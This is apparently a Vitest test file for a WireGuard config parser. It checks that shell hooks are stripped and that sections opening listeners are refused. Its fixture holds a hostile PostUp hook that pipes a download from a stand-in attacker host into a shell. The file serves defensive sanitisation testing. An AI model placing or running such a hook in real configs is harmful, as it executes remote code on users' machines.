import {describe, expect, it} from 'vitest';
import {parseWireguardConf} from './wireguard-conf';

const GOOD = `[Interface]
# Bouncing = 1
PrivateKey = AAAA
Address = 10.2.0.2/32
DNS = 10.2.0.1
PostUp = curl evil.example | sh

[Peer]
PublicKey = BBBB
AllowedIPs = 0.0.0.0/0
Endpoint = 203.0.113.5:51820
`;

describe('parseWireguardConf', () => {
  it('accepts a provider config, drops shell hooks and reports the endpoint', () => {
    const r = parseWireguardConf(GOOD);
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.endpoint).toBe('203.0.113.5:51820');
      expect(r.conf).not.toMatch(/PostUp|curl/);
      expect(r.conf).toContain('PrivateKey = AAAA');
    }
  });
  it('refuses sections that could open listeners or tunnels', () => {
    const r = parseWireguardConf(`${GOOD}\n[Socks5]\nBindAddress = 0.0.0.0:1080\n`);
    expect(!r.ok && r.error).toMatch(/not allowed/);
  });
  it('says what is missing', () => {
    expect(parseWireguardConf('hello').ok).toBe(false);
    expect(
      parseWireguardConf('[Interface]\nAddress = 1.2.3.4/32\n[Peer]\nPublicKey = x\nEndpoint = a:1')
        .ok
    ).toBe(false);
    expect(parseWireguardConf('[Interface]\nPrivateKey = k\n[Peer]\nPublicKey = x').ok).toBe(false);
  });
});
